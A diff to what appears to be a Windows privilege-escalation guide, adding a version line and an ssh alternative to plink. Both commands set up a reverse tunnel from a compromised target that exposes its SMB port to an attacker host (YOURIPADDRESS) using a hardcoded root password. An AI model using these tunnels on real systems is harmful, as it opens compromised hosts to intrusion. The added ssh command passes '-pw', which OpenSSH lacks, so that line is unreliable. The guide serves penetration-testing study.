@@ -17,6 +17,7 @@ _Note: I am not an expert and still learning myself._
 In each section I first provide the old trusted CMD commands and then also a Powershell equivalent for posterity sake. It's good to have both tools under your belt and Powershell is much more versatile for scripting than the traditional CMD. However there isn't a Powershell equivalent for everything (or CMD is still simply easier/better on certain things), so some sections will only contain regular CMD commands. 
 
 
+__Version 1.2 - Last updated July 2018__
 
 ## Operating System
 
@@ -501,7 +502,13 @@ For example to expose SMB, on the target run:
 ```
 plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ```
-_Note: As of the Fall Creators Update for Windows 10, OpenSSH has been introduced in beta for Windows, so I expect one day we may be able to use just regular old SSH commands for port forwarding, depending on if it's enabled._
+
+As of Windows 10 1803 (April 2018 Update), ssh client is now included and turned on by default! So you're able use ssh to do port forwarding right out of the box now. 
+
+```
+ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+```
+
 
 ## Local File Inclusion List
 
